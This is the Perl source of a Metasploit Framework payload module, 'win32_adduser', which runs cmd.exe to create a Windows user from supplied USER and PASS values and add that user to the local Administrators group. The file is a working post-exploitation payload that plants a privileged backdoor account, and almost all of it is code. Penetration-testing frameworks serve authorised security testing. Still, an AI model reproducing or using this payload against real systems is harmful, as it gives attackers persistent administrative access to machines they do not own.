package Msf::Payload::win32_adduser;
use strict;
use base 'Msf::PayloadComponent::Win32Execute';
sub load {
  Msf::PayloadComponent::Win32Execute->import('Msf::PayloadComponent::NoConnection');
}

my $info =
{
    'Name'         => 'winadduser',
    'Version'      => '2.0',
    'Description'  => 'Create a new user and add to local Administrators group',
    'Authors'      => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
    'Arch'         => [ 'x86' ],
    'Priv'         => 1,
    'OS'           => [ 'win32' ],
    'Multistage'   => 0,
    'Size'         => '',
    'UserOpts'     =>
        {
            'USER' => [1, 'DATA', 'The username to create'],
            'PASS' => [1, 'DATA', 'The password for this user'],
        },
};

sub new {
    load();
    my $class = shift;
    my $self = $class->SUPER::new({'Info' => $info}, @_);
    return($self);
}

sub Size {
    my $self = shift;
    $self->{WinExecCmd} = $self->_CreateCommand();
    return $self->SUPER::Size;
}

sub Build {
    my $self = shift;
    $self->{WinExecCmd} = $self->_CreateCommand();
    return $self->SUPER::Build;
}

sub _CreateCommand {
    my $self = shift;
    
    return
    "cmd.exe /c net user ".$self->GetVar('USER')." ".$self->GetVar('PASS') ." /ADD && ".
    "net localgroup Administrators ".$self->GetVar('USER'). " /ADD";
}
